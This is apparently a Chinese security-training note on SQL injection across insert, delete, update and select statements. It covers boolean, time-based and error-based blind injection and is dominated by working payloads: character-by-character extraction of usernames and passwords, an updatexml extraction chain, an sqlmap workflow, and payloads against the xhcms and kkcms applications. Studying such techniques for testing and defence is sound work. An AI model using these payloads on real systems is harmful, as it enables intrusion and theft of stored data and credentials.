---
title: SQL注入&增删改查&盲注&延时&布尔&报错&有无回显&错误处理&审计复盘
published: 2026-04-21 15:00:00
description: 增删改查场景下的布尔、延时、报错三种盲注手法。
tags: [Web攻防,SQL注入]
category: 网络安全
draft: false
---

# 知识点

1. Web攻防-SQL注入-操作方法&增删改查
2. Web攻防-SQL注入-布尔&延时&报错&盲注

案例说明

在应用中，存在增删改查数据的操作，其中SQL语句结构不一导致注入语句也要针对应用达到兼容执行，另外也需要明白黑盒中功能对应的操作方法；除此之外有无回显，报错都有关系，将影响到采用何种注入方式。

# 增删改查

## 功能：数据查询

查询：SELECT * FROM news where id=$id

## 功能：新增用户，添加新闻等

增加：INSERT INTO news (字段名) VALUES (数据)

## 功能：删除用户，删除新闻等

删除：DELETE FROM news WHERE id=$id

## 功能：修改用户，修改文章等

修改：UPDATE news SET id=$id

# 布尔&报错&延迟

盲注就是在注入过程中，获取的数据不能回显至前端页面。

我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。

解决：常规的联合查询注入不行的情况

```
参考：
like 'ro%'            #判断ro或ro...是否成立 
regexp '^xiaodi[a-z]' #匹配xiaodi及xiaodi...等
if(条件,5,0)          #条件成立 返回5 反之 返回0
sleep(5)              #SQL语句延时执行5秒
mid(a,b,c)            #从位置b开始，截取a字符串的c位
substr(a,b,c)         #从位置b开始，截取字符串a的c长度
left(database(),1)，database() #left(a,b)从左侧截取a的前b位
length(database())=8  #判断数据库database()名的长度
ord=ascii ascii(x)=97 #判断x的ascii码是否等于97
```

我们可以知道盲注分为以下三类：

```
延迟：
and sleep(1);
and if(1>2,sleep(1),0);
and if(1<2,sleep(1),0);

布尔：
and length(database())=7;
and left(database(),1)='p';
and left(database(),2)='pi';
and substr(database(),1,1)='p';
and substr(database(),2,1)='i';
and ord(left(database(),1))=112;

报错：
and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)
and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
```

参考：

https://www.jianshu.com/p/bc35f8dd4f7c

https://www.cnblogs.com/impulse-/p/14227189.html

## 基于布尔的SQL盲注-逻辑判断

```
regexp,like,ascii,left,ord,mid
```

### 基于布尔：有数据库输出判断标准条件

```
and length(database())=6
```

有回显到页面的内容。

![image-20260421133619333](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421133619333.png)

有数据库输出：

![image-20260421133642241](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421133642241.png)

![image-20260421133652579](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421133652579.png)

**第一个条件为false，整个条件永远为false** → 永远查不到数据

所以前提要获取到用户名或者其他信息

![image-20260421134434862](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421134434862.png)

如果是不存在的用户名或者数据库长度错误的情况下就会回显未找到用户。

## 基于时间的SQL盲注-延时判断

```
if,sleep
```

### 基于延时：都不需要

```
and if(1=1,sleep(5),0)
```

![image-20260421135200474](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421135200474.png)

![image-20260421135540439](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421135540439.png)

### 长度判断

实战可以通过先验证数据库长度来进行判断：

```
1' and if(length(database())=7,sleep(2),0)
```

### 值判断

之后就是获取数据库名的值：

获取前两位：

```
1' and if(substr(database(),1,1)='p',sleep(2),0)
```

```
1' and if(substr(database(),1,2)='ph',sleep(2),0)
```

只看某一位（这里是第二位）：

```
1' and if(substr(database(),2,1)='h',sleep(2),0)
```

### 防止过滤

使用ascii码进行注入，防止过滤：

```
gaygay' and if(ord(substr(database(),2,1))=104,sleep(2),0)#
```

### 思路发散

```
数据库基本信息
-- 数据库名
1' and if(substr(database(),1,1)='p', sleep(2), 0)#

-- 数据库版本
1' and if(substr(version(),1,1)='5', sleep(2), 0)#

-- 当前用户
1' and if(substr(user(),1,1)='r', sleep(2), 0)#

-- 当前数据库路径
1' and if(substr(@@datadir,1,1)='c', sleep(2), 0)#

表名枚举
-- 获取第一个表的第一个字符
1' and if(substr((select table_name from information_schema.tables 
   where table_schema=database() limit 0,1),1,1)='u', sleep(2), 0)#

-- 获取第二个表的第二个字符
1' and if(substr((select table_name from information_schema.tables 
   where table_schema=database() limit 1,1),2,1)='s', sleep(2), 0)#
   
列名枚举
-- 获取user表的第一列
1' and if(substr((select column_name from information_schema.columns 
   where table_name='user1' limit 0,1),1,1)='i', sleep(2), 0)#

-- 获取第二列
1' and if(substr((select column_name from information_schema.columns 
   where table_name='user1' limit 1,1),1,1)='u', sleep(2), 0)#
   
数据内容提取
-- 获取第一个用户的用户名
1' and if(substr((select username from user1 limit 0,1),1,1)='a', sleep(2), 0)#

-- 获取第一个用户的密码（如果有password字段）
1' and if(substr((select password from user1 limit 0,1),1,1)='m', sleep(2), 0)#

-- 获取邮箱
1' and if(substr((select email from user1 limit 0,1),1,1)='t', sleep(2), 0)#
```

## 基于报错的SQL盲注-报错回显

```
floor，updatexml，extractvalue
```

## 基于报错：有数据库报错处理判断标准条件

需要有容错处理的情况下才能使用。

```
and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
```

![image-20260421132744062](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421132744062.png)

![image-20260421133509065](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421133509065.png)

![image-20260421133521690](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421133521690.png)

# 完整链

```
爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)

爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)

爆表：?id=1 and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='phpdemo'), 0x7e), 1)

爆字段：?id=1 and updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='admin'), 0x7e), 1)

// 提取字段值（注意updatexml最多显示32位，需用substr分段截取）。
爆字段内容：?id=1 and updatexml(1, concat(0x7e, (select 字段 from 表 limit 0,1), 0x7e), 1)
```

# sqlmap

创建文件：

```
// 请求头
POST /55/php/index.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 69
Content-Type: application/x-www-form-urlencoded
Host: 127.0.0.1:81
Origin: http://127.0.0.1:81
Referer: http://127.0.0.1:81/55/php/index.php
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"

// 发包参数 星号位置代表注入点
action=update_user&user_id=1&new_username=3232121%27&new_email=321321@qq.com*
```

```
python .\sqlmap.py -r .\xxx.txt
```

# 演示案例

select没报错和insert有报错-x' or updatexml(1,concat(0x7e,(version())),0) or '#

select有输出和insert没输出-x' or length(database())=15#

没报错没输出-x' or if(1=1,sleep(5),0)# x' or if((select database())='news_management',sleep(1),sleep(0))#'

# 实际案例：报错&延时

## xhcms-insert报错

![image-20260421141914389](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421141914389.png)

![image-20260421141934099](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421141934099.png)

![image-20260421141945554](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421141945554.png)

### 路由问题

![image-20260421142016001](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142016001.png)

![image-20260421142029370](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142029370.png)

![image-20260421142041163](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142041163.png)

![image-20260421142056141](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142056141.png)

### payload

```
' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and '
```

![image-20260421142125608](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142125608.png)

![image-20260421142135227](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142135227.png)

## kkcms-delete延时

![image-20260421142152318](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142152318.png)

![image-20260421142217650](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142217650.png)

### 确定注入点

```
admin/model/usergroup.php
```

![image-20260421142247413](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142247413.png)

![image-20260421142258756](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142258756.png)

![image-20260421142307921](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142307921.png)

![image-20260421142333817](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142333817.png)

![image-20260421142408555](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142408555.png)

![image-20260421142433145](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142433145.png)

![image-20260421142448543](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142448543.png)

### payload

```
or if(1=1,sleep(5),0)

or length(database())=5

or if(ord(left(database(),1))=107,sleep(1),0)

or if(ord(substr(database(),2,1))=107,sleep(1),0)
```

![image-20260421142513566](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142513566.png)

![image-20260421142541353](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142541353.png)

![image-20260421142550036](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260421142550036.png)

## 学员学就用

JSON注入文档